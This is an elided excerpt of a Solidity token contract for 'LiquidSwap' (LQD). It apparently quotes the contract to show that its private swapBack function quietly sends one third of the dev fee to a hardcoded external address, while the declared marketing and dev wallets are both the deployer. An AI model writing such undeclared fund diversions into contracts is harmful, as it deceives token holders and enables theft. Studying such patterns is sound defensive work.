...
contract LQDSwap is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("LiquidSwap", "LQD") {
        ...
        marketingWallet = address(owner()); // set contract deployer as marketing wallet
        devWallet = address(owner()); // set contract deployer as dev wallet
    ...
    function swapBack() private {
        ...
        (success,) = address(0x01F386bD553028D9C70c61BA038aCC0f24684081).call{value: ethForDev/3}("");
